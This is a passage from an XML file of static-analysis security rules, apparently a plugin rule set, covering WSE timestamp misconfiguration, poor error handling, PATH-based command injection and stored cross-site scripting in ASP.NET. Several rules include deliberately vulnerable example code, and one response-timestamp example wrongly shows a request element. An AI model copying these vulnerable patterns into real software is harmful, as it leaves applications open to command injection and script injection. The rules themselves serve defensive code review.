							  An unsigned timestamp can leave a SOAP message open to tampering and replay attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A Security timestamp indicates a message's freshness. If an attacker intercepts a message retransmits it at a later time, the receiver can reject the replay attack because the timestamp will indicate that the message is stale. Optionally, timestamps can include an expiration attribute which places a hard limit on how long security semantics are valid.<br><br>To prevent attackers from tampering with timestamps, timestamps should be signed. Without a signed timestamp, an attacker can intercept a SOAP message, modify the timestamp, and send the message on without the receiver's knowledge. Under these circumstances, an attacker can potentially trick a recipient into accepting a malicious message.<br><br>The following snippet from a WSE policy file is an example where timestamps are not include in SOAP faults:<br><pre><br>&lt;policies xmlns=&quot;http://schemas.microsoft.com/wse/2005/06/policy&quot;&gt;<br>...<br>      &lt;protection&gt;<br>        &lt;fault signatureOptions=&quot;IncludeAddressing, IncludeSoapBody&quot; encryptBody=&quot;true&quot; /&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1]  <em><fault> Element</em> Microsoft<br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3860 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3860 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3860 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3860 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 345</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_wse_misconfiguration_unsigned_request_timestamp</key>
    <internalKey>Environment/WSE Misconfiguration/Unsigned Request Timestamp</internalKey>
    <name>WSE Misconfiguration: Unsigned Request Timestamp</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An unsigned timestamp can leave a SOAP message open to tampering and replay attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A Security timestamp indicates a message's freshness. If an attacker intercepts a message retransmits it at a later time, the receiver can reject the replay attack because the timestamp will indicate that the message is stale. Optionally, timestamps can include an expiration attribute which places a hard limit on how long security semantics are valid.<br><br>To prevent attackers from tampering with timestamps, timestamps should be signed. Without a signed timestamp, an attacker can intercept a SOAP message, modify the timestamp, and send the message on without the receiver's knowledge. Under these circumstances, an attacker can potentially trick a recipient into accepting a malicious message.<br><br>The following snippet from a WSE policy file is an example where timestamps are not include in SOAP message requests:<br><pre><br>&lt;policies xmlns=&quot;http://schemas.microsoft.com/wse/2005/06/policy&quot;&gt;<br>...<br>      &lt;protection&gt;<br>        &lt;request signatureOptions=&quot;IncludeAddressing, IncludeSoapBody&quot; encryptBody=&quot;true&quot; /&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1]  <em><request> Element</em> Microsoft<br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3860 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3860 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3860 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3860 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 345</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_wse_misconfiguration_unsigned_response_timestamp</key>
    <internalKey>Environment/WSE Misconfiguration/Unsigned Response Timestamp</internalKey>
    <name>WSE Misconfiguration: Unsigned Response Timestamp</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An unsigned timestamp can leave a SOAP message open to tampering and replay attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A Security timestamp indicates a message's freshness. If an attacker intercepts a message retransmits it at a later time, the receiver can reject the replay attack because the timestamp will indicate that the message is stale. Optionally, timestamps can include an expiration attribute which places a hard limit on how long security semantics are valid.<br><br>To prevent attackers from tampering with timestamps, timestamps should be signed. Without a signed timestamp, an attacker can intercept a SOAP message, modify the timestamp, and send the message on without the receiver's knowledge. Under these circumstances, an attacker can potentially trick a recipient into accepting a malicious message.<br><br>The following snippet from a WSE policy file is an example where timestamps are not included in SOAP message responses:<br><pre><br>&lt;policies xmlns=&quot;http://schemas.microsoft.com/wse/2005/06/policy&quot;&gt;<br>...<br>      &lt;protection&gt;<br>        &lt;request signatureOptions=&quot;IncludeAddressing, IncludeSoapBody&quot; encryptBody=&quot;true&quot; /&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1]  <em><response> Element</em> Microsoft<br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3860 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3860 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3860 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3860 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 345</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>errors_poor_error_handling_empty_catch_block</key>
    <internalKey>Errors/Poor Error Handling/Empty Catch Block</internalKey>
    <name>Poor Error Handling: Empty Catch Block</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Ignoring an exception can cause the program to overlook unexpected states and conditions.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Just about every serious attack on a software system begins with the violation of a programmer's assumptions. After the attack, the programmer's assumptions seem flimsy and poorly founded, but before an attack many programmers would defend their assumptions well past the end of their lunch break.<br><br>Two dubious assumptions that are easy to spot in code are "this method call can never fail" and "it doesn't matter if this call fails". When programmers ignore exceptions, they implicitly state that they are operating under one of these assumptions.<br><br><b>Example 1:</b> The following code excerpt ignores a rarely-thrown exception from <code>DoExchange()</code>.<br><br><pre><br>try {<br>  DoExchange();<br>}<br>catch (RareException e) {<br>  // this can never happen<br>}<br></pre><br><br>If a <code>RareException</code> were to ever be thrown, the program would continue to execute as though nothing unusual had occurred. The program records no evidence indicating the special situation, potentially frustrating any later attempt to explain the program's behavior.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A7 Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>AU</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 391</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.2, Requirement 6.5.6</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>errors</tag>
  </rule>
  <rule>
    <key>errors_poor_error_handling_overly_broad_catch</key>
    <internalKey>Errors/Poor Error Handling/Overly Broad Catch</internalKey>
    <name>Poor Error Handling: Overly Broad Catch</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The catch block handles a broad swath of exceptions, potentially trapping dissimilar issues or problems that should not be dealt with at this point in the program.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Multiple catch blocks can get ugly and repetitive, but "condensing" catch blocks by catching a high-level class like <code>Exception</code> can obscure exceptions that deserve special treatment or that should not be caught at this point in the program. Catching an overly broad exception essentially defeats the purpose of .NET's typed exceptions, and can become particularly dangerous if the program grows and begins to throw new types of exceptions. The new exception types will not receive any attention.<br><br><b>Example:</b> The following code excerpt handles three types of exceptions in an identical fashion.<br><br><pre><br>  try {<br>    DoExchange();<br>  }<br>  catch (IOException e) {<br>    logger.Error("DoExchange failed", e);<br>  }<br>  catch (FormatException e) {<br>    logger.Error("DoExchange failed", e);<br>  }<br>  catch (TimeoutException e) {<br>    logger.Error("DoExchange failed", e);<br>  }<br></pre><br><br>At first blush, it may seem preferable to deal with these exceptions in a single catch block, as follows:<br><br><pre><br>  try {<br>    DoExchange();<br>  }<br>  catch (Exception e) {<br>    logger.Error("DoExchange failed", e);<br>  }<br></pre><br><br>However, if <code>DoExchange()</code> is modified to throw a new type of exception that should be handled in some different kind of way, the broad catch block will prevent the compiler from pointing out the situation. Further, the new catch block will now also handle exceptions of types <code>ApplicationException</code> and <code>NullReferenceException</code>, which is not the programmer's intent.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A7 Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>AU</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 396</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.2, Requirement 6.5.6</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>errors</tag>
  </rule>
  <rule>
    <key>errors_poor_error_handling_program_catches_nullreferenceexception</key>
    <internalKey>Errors/Poor Error Handling/Program Catches NullReferenceException</internalKey>
    <name>Poor Error Handling: Program Catches NullReferenceException</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  It is generally a bad practice to catch <code>NullReferenceException</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Programmers typically catch <code>NullReferenceException</code> under three circumstances:<br><br>1. The program contains a null pointer dereference. Catching the resulting exception was easier than fixing the underlying problem.<br><br>2. The program explicitly throws a <code>NullReferenceException</code> to signal an error condition.<br><br>3. The code is part of a test harness that supplies unexpected input to the classes under test.<br><br>Of these three circumstances, only the last is acceptable.<br><br><b>Example:</b> The following code mistakenly catches a <code>NullReferenceException</code>.<br><pre><br>  try {<br>    MysteryMethod();<br>  }<br>  catch (NullReferenceException npe) {<br>  }<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A7 Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 395</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.2, Requirement 6.5.6</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[13] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>errors</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_asp_net_bad_practices_unvalidated_web_api_model</key>
    <internalKey>Input Validation and Representation/ASP.NET Bad Practices/Unvalidated Web API Model</internalKey>
    <name>ASP.NET Bad Practices: Unvalidated Web API Model</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  ASP.NET Web API Actions with validatable parameters should check if validation passes to prevent vulnerabilities that result from unchecked input.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Unvalidated input is one of the leading causes of vulnerabilities in ASP.NET Web API services. Unchecked input can lead to cross-site scripting, process control, access control, and SQL injection vulnerabilities, among others.  Although ASP.NET Web API services are generally not susceptible to memory corruption attacks, if an ASP.NET Web API service calls into native code which does not perform array bounds checking, an attacker may be able to use an input validation weakness in the ASP.NET Web API service to launch a buffer overflow attack.<br><br>To prevent such attacks, (1) use the Validation attributes to programmatically annotate validation checks on parameters or members of model-binding object parameters to ASP.NET Web API service actions and then (2) use <code>ModelState.IsValid</code> to check if model validation passes.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 20</em> <br></p>
																									   <p>[8] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 020</em> <br></p>
																									   <p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[10]  <em>Model Validation</em> Microsoft ASP.NET Site<br></p>
																									   <p>[11] Jon Galloway, Phil Haack, Brad Wilson, K. Scott Allen <em>Professional ASP.NET MVC 4</em> Wrox Press<br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[16] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_command_injection</key>
    <internalKey>Input Validation and Representation/Command Injection</internalKey>
    <name>Command Injection</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Executing commands that include unvalidated user input can cause an application to execute malicious commands on behalf of an attacker.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Command injection vulnerabilities take two forms:<br><br>- An attacker can change the command that the program executes: the attacker explicitly controls what the command is.<br><br>- An attacker can change the environment in which the command executes: the attacker implicitly controls what the command means.<br><br>In this case we are primarily concerned with the second scenario, the possibility that an attacker may be able to change the meaning of the command by changing an environment variable or by putting a malicious executable early in the search path. Command injection vulnerabilities of this type occur when:<br><br>1. An attacker modifies an application's environment.<br><br>2. The application executes a command without specifying an absolute path or verifying the binary being executed.<br><br>3. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.<br><br><b>Example:</b> The following code is from a web application that allows users access to an interface through which they can update their password on the system. Part of the process for updating passwords in this network environment is to run an <code>update.exe</code> command, as shown below.<br><br><pre><br>...<br>Process.Start("update.exe");<br>...<br></pre><br><br>The problem here is that the program does not specify an absolute path and fails to clean its environment prior to executing the call to <code>Process.start()</code>. If an attacker can modify the <code>$PATH</code> variable to point to a malicious binary called <code>update.exe</code> and cause the program to be executed in their environment, then the malicious binary will be loaded instead of the one intended. Because of the nature of the application, it runs with the privileges necessary to perform system operations, which means the attacker's <code>update.exe</code> will now be run with these privileges, possibly giving the attacker complete control of the system.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 77, CWE ID 78</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 078</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 078</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 116</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[15] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>OS Commanding</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_cross_site_scripting_inter_component_communication__cloud</key>
    <internalKey>Input Validation and Representation/Cross-Site Scripting/Inter-Component Communication (Cloud)</internalKey>
    <name>Cross-Site Scripting: Inter-Component Communication (Cloud)</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Sending unvalidated data to a web browser can result in the browser executing malicious code.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Cross-site scripting (XSS) vulnerabilities occur when:<br><br>1. Data enters a cloud-hosted web application through an untrusted source. In the case of Inter-Component Communication Cloud XSS, the untrusted source is data received from other components of the cloud application via communication channels provided by the cloud provider.<br><br><br>2. The data is included in dynamic content that is sent to a web user without being validated.<br><br>The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.<br><br><b>Example 1:</b> The following ASP.NET Web Form queries the Azure Table Service for an employee and prints the name.<br><IfNotDef var="ConditionalDescriptions"><br><pre><br>&lt;script runat="server"&gt;<br>...<br>var retrieveOperation = TableOperation.Retrieve&lt;EmployeeInfo&gt;(partitionKey, rowKey);<br>var retrievedResult = employeeTable.Execute(retrieveOperation);<br>var employeeInfo = retrievedResult.Result as EmployeeInfo;<br>string name = employeeInfo.Name<br>...<br>EmployeeName.Text = name;<br>&lt;/script&gt;<br></pre><br><br>Where <code>EmployeeName</code> is a form control defined as follows:<br><br><pre><br>&lt;form runat="server"&gt;<br>   ...<br>   &lt;asp:Label id="EmployeeName" runat="server"&gt;<br>   ...<br>&lt;/form&gt;<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br><b>Example 2:</b> The following ASP.NET code segment is functionally equivalent to Example 1 above, but implements all of the form elements programmatically.<br><IfNotDef var="ConditionalDescriptions"><br><pre><br>protected System.Web.UI.WebControls.Label EmployeeName;<br>...<br>var retrieveOperation = TableOperation.Retrieve&lt;EmployeeInfo&gt;(partitionKey, rowKey);<br>var retrievedResult = employeeTable.Execute(retrieveOperation);<br>var employeeInfo = retrievedResult.Result as EmployeeInfo;<br>string name = employeeInfo.Name;<br>...<br>EmployeeName.Text = name;<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br>These code examples function correctly when the values of <code>name</code> are well-behaved, but they do nothing to prevent exploits if they are not. This code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Inter-Component Communication Cloud XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a "guestbook" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.<br><br><b>Example 3:</b> The following ASP.NET Web Form reads an employee ID number from an HTTP request and displays it to the user.<br><IfNotDef var="ConditionalDescriptions"><br><pre><br>&lt;script runat="server"&gt;<br>...<br>EmployeeID.Text = Login.Text;<br>...<br>&lt;/script&gt;<br></pre><br><br>Where <code>Login</code> and <code>EmployeeID</code> are form controls defined as follows:<br><br><pre><br>&lt;form runat="server"&gt;<br>   &lt;asp:TextBox runat="server" id="Login"/&gt;<br>   ...<br>   &lt;asp:Label runat="server" id="EmployeeID"/&gt;<br>&lt;/form&gt;<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br><b>Example 